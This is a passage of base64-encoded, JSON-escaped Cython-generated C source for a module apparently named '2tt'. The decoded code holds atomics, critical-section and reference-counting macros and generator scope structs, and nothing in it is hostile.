gQyBhdG9taWNzIlxuICAgICNlbmRpZlxuI2VsaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKGRlZmluZWQoX19jcGx1c3BsdXMpICYmIChcXFxuICAgICAgICAgICAgICAgICAgICAoX19jcGx1c3BsdXMgPj0gMjAxMTAzTCkgfHxcXFxuXFxcbiAgICAgICAgICAgICAgICAgICAgKGRlZmluZWQoX01TQ19WRVIpICYmIF9NU0NfVkVSID49IDE3MDApKSAmJlxcXG4gICAgICAgICAgICAgICAgICAgIEFUT01JQ19JTlRfTE9DS19GUkVFID09IDIpXG4gICAgI3VuZGVmIF9fcHl4X2F0b21pY19pbnRfdHlwZVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2ludF90eXBlIHN0ZDo6YXRvbWljX2ludFxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3B0cl90eXBlIHN0ZDo6YXRvbWljX3VpbnRwdHJfdFxuICAgICNkZWZpbmUgX19weXhfbm9uYXRvbWljX3B0cl90eXBlIHVpbnRwdHJfdFxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZCh2YWx1ZSkgc3RkOjphdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBzdGQ6Om1lbW9yeV9vcmRlcl9yZWxheGVkKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCh2YWx1ZSkgc3RkOjphdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBzdGQ6Om1lbW9yeV9vcmRlcl9hY3FfcmVsKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgc3RkOjphdG9taWNfZmV0Y2hfc3ViX2V4cGxpY2l0KHZhbHVlLCAxLCBzdGQ6Om1lbW9yeV9vcmRlcl9hY3FfcmVsKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N1Yih2YWx1ZSwgYXJnKSBzdGQ6OmF0b21pY19mZXRjaF9zdWIodmFsdWUsIGFyZylcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKHZhbHVlLCBleHBlY3RlZCwgZGVzaXJlZCkgc3RkOjphdG9taWNfY29tcGFyZV9leGNoYW5nZV9zdHJvbmcodmFsdWUsIGV4cGVjdGVkLCBkZXNpcmVkKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2xvYWQodmFsdWUpIHN0ZDo6YXRvbWljX2xvYWQodmFsdWUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSkgc3RkOjphdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCh2YWx1ZSkgc3RkOjphdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgc3RkOjptZW1vcnlfb3JkZXJfcmVsYXhlZClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSh2YWx1ZSkgc3RkOjphdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgc3RkOjptZW1vcnlfb3JkZXJfYWNxdWlyZSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKHZhbHVlLCBuZXdfdmFsdWUpIHN0ZDo6YXRvbWljX2V4Y2hhbmdlKHZhbHVlLCAoX19weXhfbm9uYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2NtcF9leGNoYW5nZSh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpIHN0ZDo6YXRvbWljX2NvbXBhcmVfZXhjaGFuZ2Vfc3Ryb25nKHZhbHVlLCBleHBlY3RlZCwgZGVzaXJlZClcbiAgICAjaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKSAmJiBkZWZpbmVkKF9NU0NfVkVSKVxuICAgICAgICAjcHJhZ21hIG1lc3NhZ2UgKCJVc2luZyBzdGFuZGFyZCBDKysgYXRvbWljcyIpXG4gICAgI2VsaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKVxuICAgICAgICAjd2FybmluZyAiVXNpbmcgc3RhbmRhcmQgQysrIGF0b21pY3MiXG4gICAgI2VuZGlmXG4jZWxpZiBDWVRIT05fQVRPTUlDUyAmJiAoX19HTlVDX18gPj0gNSB8fCAoX19HTlVDX18gPT0gNCAmJlxcXG4gICAgICAgICAgICAgICAgICAgIChfX0dOVUNfTUlOT1JfXyA+IDEgfHxcXFxuICAgICAgICAgICAgICAgICAgICAoX19HTlVDX01JTk9SX18gPT0gMSAmJiBfX0dOVUNfUEFUQ0hMRVZFTF9fID49IDIpKSkpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcHRyX3R5cGUgdm9pZCpcbiAgICAjZGVmaW5lIF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSB2b2lkKlxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDEpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwodmFsdWUpIF9fc3luY19mZXRjaF9hbmRfc3ViKHZhbHVlLCAxKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N1Yih2YWx1ZSwgYXJnKSBfX3N5bmNfZmV0Y2hfYW5kX3N1Yih2YWx1ZSwgYXJnKVxuICAgIHN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZShfX3B5eF9hdG9taWNfaW50X3R5cGUqIHZhbHVlLCBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUqIGV4cGVjdGVkLCBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgZGVzaXJlZCkge1xuICAgICAgICBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgb2xkID0gX19zeW5jX3ZhbF9jb21wYXJlX2FuZF9zd2FwKHZhbHVlLCAqZXhwZWN0ZWQsIGRlc2lyZWQpO1xuICAgICAgICBpbnQgcmVzdWx0ID0gb2xkID09ICpleHBlY3RlZDtcbiAgICAgICAgKmV4cGVjdGVkID0gb2xkO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19sb2FkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdG9yZSh2YWx1ZSwgbmV3X3ZhbHVlKSBfX3N5bmNfbG9ja190ZXN0X2FuZF9zZXQodmFsdWUsIG5ld192YWx1ZSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDApXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX2FjcXVpcmUodmFsdWUpIF9fc3luY19mZXRjaF9hbmRfYWRkKHZhbHVlLCAwKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgX19zeW5jX2xvY2tfdGVzdF9hbmRfc2V0KHZhbHVlLCAoX19weXhfYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSlcbiAgICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19weXhfYXRvbWljX3BvaW50ZXJfY21wX2V4Y2hhbmdlKF9fcHl4X2F0b21pY19wdHJfdHlwZSogdmFsdWUsIF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSogZXhwZWN0ZWQsIF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSBkZXNpcmVkKSB7XG4gICAgICAgIF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSBvbGQgPSBfX3N5bmNfdmFsX2NvbXBhcmVfYW5kX3N3YXAodmFsdWUsICpleHBlY3RlZCwgZGVzaXJlZCk7XG4gICAgICAgIGludCByZXN1bHQgPSBvbGQgPT0gKmV4cGVjdGVkO1xuICAgICAgICAqZXhwZWN0ZWQgPSBvbGQ7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTXG4gICAgICAgICN3YXJuaW5nICJVc2luZyBHTlUgYXRvbWljcyJcbiAgICAjZW5kaWZcbiNlbGlmIENZVEhPTl9BVE9NSUNTICYmIGRlZmluZWQoX01TQ19WRVIpXG4gICAgI2luY2x1ZGUgPGludHJpbi5oPlxuICAgICN1bmRlZiBfX3B5eF9hdG9taWNfaW50X3R5cGVcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBsb25nXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcHRyX3R5cGUgdm9pZCpcbiAgICAjdW5kZWYgX19weXhfbm9uYXRvbWljX2ludF90eXBlXG4gICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgbG9uZ1xuICAgICNkZWZpbmUgX19weXhfbm9uYXRvbWljX3B0cl90eXBlIHZvaWQqXG4gICAgI3ByYWdtYSBpbnRyaW5zaWMgKF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkLCBfSW50ZXJsb2NrZWRFeGNoYW5nZSwgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlLCBfSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2VQb2ludGVyLCBfSW50ZXJsb2NrZWRFeGNoYW5nZVBvaW50ZXIpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKHZhbHVlKSBfSW50ZXJsb2NrZWRFeGNoYW5nZUFkZCh2YWx1ZSwgMSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAxKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VBZGQodmFsdWUsIC0xKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N1Yih2YWx1ZSwgYXJnKSBfSW50ZXJsb2NrZWRFeGNoYW5nZUFkZCh2YWx1ZSwgLWFyZylcbiAgICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoX19weXhfYXRvbWljX2ludF90eXBlKiB2YWx1ZSwgX19weXhfbm9uYXRvbWljX2ludF90eXBlKiBleHBlY3RlZCwgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGRlc2lyZWQpIHtcbiAgICAgICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIG9sZCA9IF9JbnRlcmxvY2tlZENvbXBhcmVFeGNoYW5nZSh2YWx1ZSwgZGVzaXJlZCwgKmV4cGVjdGVkKTtcbiAgICAgICAgaW50IHJlc3VsdCA9IG9sZCA9PSAqZXhwZWN0ZWQ7XG4gICAgICAgICpleHBlY3RlZCA9IG9sZDtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VBZGQodmFsdWUsIDApXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCh2YWx1ZSkgKih2b2lkICogdm9sYXRpbGUgKil2YWx1ZVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBfSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2VQb2ludGVyKHZhbHVlLCAwLCAwKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VQb2ludGVyKHZhbHVlLCAoX19weXhfYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSlcbiAgICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19weXhfYXRvbWljX3BvaW50ZXJfY21wX2V4Y2hhbmdlKF9fcHl4X2F0b21pY19wdHJfdHlwZSogdmFsdWUsIF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSogZXhwZWN0ZWQsIF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSBkZXNpcmVkKSB7XG4gICAgICAgIF9fcHl4X2F0b21pY19wdHJfdHlwZSBvbGQgPSBfSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2VQb2ludGVyKHZhbHVlLCBkZXNpcmVkLCAqZXhwZWN0ZWQpO1xuICAgICAgICBpbnQgcmVzdWx0ID0gb2xkID09ICpleHBlY3RlZDtcbiAgICAgICAgKmV4cGVjdGVkID0gb2xkO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiAgICAjaWZkZWYgX19QWVhfREVCVUdfQVRPTUlDU1xuICAgICAgICAjcHJhZ21hIG1lc3NhZ2UgKCJVc2luZyBNU1ZDIGF0b21pY3MiKVxuICAgICNlbmRpZlxuI2Vsc2VcbiAgICAjdW5kZWYgQ1lUSE9OX0FUT01JQ1NcbiAgICAjZGVmaW5lIENZVEhPTl9BVE9NSUNTIDBcbiAgICAjaWZkZWYgX19QWVhfREVCVUdfQVRPTUlDU1xuICAgICAgICAjd2FybmluZyAiTm90IHVzaW5nIGF0b21pY3MiXG4gICAgI2VuZGlmXG4jZW5kaWZcblxuXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uIHZvaWQqXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uMiB2b2lkKlxuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbl9FbmQoY3MpXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uMl9FbmQoY3MpXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbiBQeUNyaXRpY2FsU2VjdGlvblxuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbjIgUHlDcml0aWNhbFNlY3Rpb24yXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0VuZCBQeUNyaXRpY2FsU2VjdGlvbl9FbmRcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb24yX0VuZCBQeUNyaXRpY2FsU2VjdGlvbjJfRW5kXG4jZW5kaWZcblxuXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luKGNzLCBhcmcpICh2b2lkKShjcylcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb24yX0JlZ2luKGNzLCBhcmcxLCBhcmcyKSAodm9pZCkoY3MpXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbl9CZWdpbiBQeUNyaXRpY2FsU2VjdGlvbl9CZWdpblxuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbjJfQmVnaW4gUHlDcml0aWNhbFNlY3Rpb24yX0JlZ2luXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG8pIHtcbiNkZWZpbmUgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKSB9XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT05cbiNkZWZpbmUgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04gUHlfRU5EX0NSSVRJQ0FMX1NFQ1RJT05cbiNlbmRpZlxuXG5cbiNpbmNsdWRlIDxzdHJ1Y3RtZW1iZXIuaD5cblxuXG5cblxuXG5cbnN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsO1xuc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcjtcbnN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHI7XG5zdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByO1xuc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcjtcblxuXG5zdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCB7XG4gIFB5T2JqZWN0X0hFQURcbiAgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZjtcbn07XG5cblxuXG5zdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByIHtcbiAgUHlPYmplY3RfSEVBRFxuICBzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqX19weXhfb3V0ZXJfc2NvcGU7XG4gIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wO1xuICBQeU9iamVjdCAqX19weXhfdl9pO1xufTtcblxuXG5cbnN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIge1xuICBQeU9iamVjdF9IRUFEXG4gIHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsICpfX3B5eF9vdXRlcl9zY29wZTtcbiAgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzA7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2k7XG59O1xuXG5cblxuc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciB7XG4gIFB5T2JqZWN0X0hFQURcbiAgc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0X190bGwgKl9fcHl4X291dGVyX3Njb3BlO1xuICBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfaTtcbn07XG5cblxuXG5zdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByIHtcbiAgUHlPYmplY3RfSEVBRFxuICBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZnV0dXJlO1xuICBQeU9iamVjdCAqX19weXhfdF8wO1xuICBQeV9zc2l6ZV90IF9fcHl4X3RfMTtcbiAgUHlfc3NpemVfdCBfX3B5eF90XzI7XG4gIGludCBfX3B5eF90XzM7XG59O1xuXG5cblxuXG5cbiNpZm5kZWYgQ1lUSE9OX1JFRk5BTk5ZXG4gICNkZWZpbmUgQ1lUSE9OX1JFRk5BTk5ZIDBcbiNlbmRpZlxuI2lmIENZVEhPTl9SRUZOQU5OWVxuICB0eXBlZGVmIHN0cnVjdCB7XG4gICAgdm9pZCAoKklOQ1JFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7XG4gICAgdm9pZCAoKkRFQ1JFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7XG4gICAgdm9pZCAoKkdPVFJFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7XG4gICAgdm9pZCAoKkdJVkVSRUYpKHZvaWQqLCBQeU9iamVjdCosIFB5X3NzaXplX3QpO1xuICAgIHZvaWQqICgqU2V0dXBDb250ZXh0KShjb25zdCBjaGFyKiwgUHlfc3NpemVfdCwgY29uc3QgY2hhciopO1xuICAgIHZvaWQgKCpGaW5pc2hDb250ZXh0KSh2b2lkKiopO1xuICB9IF9fUHl4X1JlZk5hbm55QVBJU3RydWN0O1xuICBzdGF0aWMgX19QeXhfUmVmTmFubnlBUElTdHJ1Y3QgKl9fUHl4X1JlZk5hbm55ID0gTlVMTDtcbiAgc3RhdGljIF9fUHl4X1JlZk5hbm55QVBJU3RydWN0ICpfX1B5eF9SZWZOYW5ueUltcG9ydEFQSShjb25zdCBjaGFyICptb2RuYW1lKTtcbiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucyB2b2lkICpfX3B5eF9yZWZuYW5ueSA9IE5VTEw7XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQobmFtZSwgYWNxdWlyZV9naWwpXFxcbiAgICAgICAgICBpZiAoYWNxdWlyZV9naWwpIHtcXFxuICAgICAgICAgICAgICBQeUdJTFN0YXRlX1NUQVRFIF9fcHl4X2dpbHN0YXRlX3NhdmUgPSBQeUdJTFN0YXRlX0Vuc3VyZSgpO1xcXG4gICAgICAgICAgICAgIF9fcHl4X3JlZm5hbm55ID0gX19QeXhfUmVmTmFubnktPlNldHVwQ29udGV4dCgobmFtZSksIChfX0xJTkVfXyksIChfX0ZJTEVfXykpO1xcXG4gICAgICAgICAgICAgIFB5R0lMU3RhdGVfUmVsZWFzZShfX3B5eF9naWxzdGF0ZV9zYXZlKTtcXFxuICAgICAgICAgIH0gZWxzZSB7XFxcbiAgICAgICAgICAgICAgX19weXhfcmVmbmFubnkgPSBfX1B5eF9SZWZOYW5ueS0+U2V0dXBDb250ZXh0KChuYW1lKSwgKF9fTElORV9fKSwgKF9fRklMRV9fKSk7XFxcbiAgICAgICAgICB9XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0Tm9naWwoKSB7XFxcbiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcXFxuICAgICAgICAgICAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcXFxuICAgICAgICAgICAgICBQeUdJTFN0YXRlX1JlbGVhc2UoX19weXhfZ2lsc3RhdGVfc2F2ZSk7XFxcbiAgICAgICAgICB9XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0Tm9naWwoKSB7XFxcbiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcXFxuICAgICAgICAgICAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcXFxuICAgICAgICAgICAgICBQeUdJTFN0YXRlX1JlbGVhc2UoX19weXhfZ2lsc3RhdGVfc2F2ZSk7XFxcbiAgICAgICAgICB9XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KClcXFxuICAgICAgICAgIF9fUHl4X1JlZk5hbm55LT5GaW5pc2hDb250ZXh0KCZfX3B5eF9yZWZuYW5ueSlcbiAgI2RlZmluZSBfX1B5eF9JTkNSRUYocikgIF9fUHl4X1JlZk5hbm55LT5JTkNSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSlcbiAgI2RlZmluZSBfX1B5eF9ERUNSRUYocikgIF9fUHl4X1JlZk5hbm55LT5ERUNSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSlcbiAgI2RlZmluZSBfX1B5eF9HT1RSRUYocikgIF9fUHl4X1JlZk5hbm55LT5HT1RSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSlcbiAgI2RlZmluZSBfX1B5eF9HSVZFUkVGKHIpIF9fUHl4X1JlZk5hbm55LT5HSVZFUkVGKF9fcHl4X3JlZm5hbm55LCAoUHlPYmplY3QgKikociksIChfX0xJTkVfXykpXG4gICNkZWZpbmUgX19QeXhfWElOQ1JFRihyKSAgZG8geyBpZigocikgPT0gTlVMTCk7IGVsc2Uge19fUHl4X0lOQ1JFRihyKTsgfX0gd2hpbGUoMClcbiAgI2RlZmluZSBfX1B5eF9YREVDUkVGKHIpICBkbyB7IGlmKChyKSA9PSBOVUxMKTsgZWxzZSB7X19QeXhfREVDUkVGKHIpOyB9fSB3aGlsZSgwKVxuICAjZGVmaW5lIF9fUHl4X1hHT1RSRUYocikgIGRvIHsgaWYoKHIpID09IE5VTEwpOyBlbHNlIHtfX1B5eF9HT1RSRUYocik7IH19IHdoaWxlKDApXG4gICNkZWZpbmUgX19QeXhfWEdJVkVSRUYocikgZG8geyBpZigocikgPT0gTlVMTCk7IGVsc2Uge19fUHl4X0dJVkVSRUYocik7fX0gd2hpbGUoMClcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dChuYW1lLCBhY3F1aXJlX2dpbClcbiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHROb2dpbCgpXG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KClcbiAgI2RlZmluZSBfX1B5eF9JTkNSRUYocikgUHlfSU5DUkVGKHIpXG4gICNkZWZpbmUgX19QeXhfREVDUkVGKHIpIFB5X0RFQ1JFRihyKVxuICAjZGVmaW5lIF9fUHl4X0dPVFJFRihyKVxuICAjZGVmaW5lIF9fUHl4X0dJVkVSRUYocilcbiAgI2RlZmluZSBfX1B5eF9YSU5DUkVGKHIpIFB5X1hJTkNSRUYocilcbiAgI2RlZmluZSBfX1B5eF9YREVDUkVGKHIpIFB5X1hERUNSRUYocilcbiAgI2RlZmluZSBfX1B5eF9YR09UUkVGKHIpXG4gICNkZWZpbmUgX19QeXhfWEdJVkVSRUYocilcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeV9YREVDUkVGX1NFVChyLCB2KSBkbyB7XFxcbiAgICAgICAgUHlPYmplY3QgKnRtcCA9IChQeU9iamVjdCAqKSByO1xcXG4gICAgICAgIHIgPSB2OyBQeV9YREVDUkVGKHRtcCk7XFxcbiAgICB9IHdoaWxlICgwKVxuI2RlZmluZSBfX1B5eF9YREVDUkVGX1NFVChyLCB2KSBkbyB7XFxcbiAgICAgICAgUHlPYmplY3QgKnRtcCA9IChQeU9iamVjdCAqKSByO1xcXG4gICAgICAgIHIgPSB2OyBfX1B5eF9YREVDUkVGKHRtcCk7XFxcbiAgICB9IHdoaWxlICgwKVxuI2RlZmluZSBfX1B5eF9ERUNSRUZfU0VUKHIsIHYpIGRvIHtcXFxuICAgICAgICBQeU9iamVjdCAqdG1wID0gKFB5T2JqZWN0ICopIHI7XFxcbiAgICAgICAgciA9IHY7IF9fUHl4X0RFQ1JFRih0bXApO1xcXG4gICAgfSB3aGlsZSAoMClcbiNkZWZpbmUgX19QeXhfQ0xFQVIocikgICAgZG8geyBQeU9iamVjdCogdG1wID0gKChQeU9iamVjdCopKHIpKTsgciA9IE5VTEw7IF9fUHl4X0RFQ1JFRih0bXApO30gd2hpbGUoMClcbiNkZWZpbmUgX19QeXhfWENMRUFSKHIpICAgZG8geyBpZigocikgIT0gTlVMTCkge1B5T2JqZWN0KiB0bXAgPSAoKFB5T2JqZWN0KikocikpOyByID0gTlVMTDsgX19QeXhfREVDUkVGKHRtcCk7fX0gd2hpbGUoMClcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoZXJyKSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzSW5TdGF0ZShfX3B5eF90c3RhdGUsIGVycilcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzSW5TdGF0ZShQeVRocmVh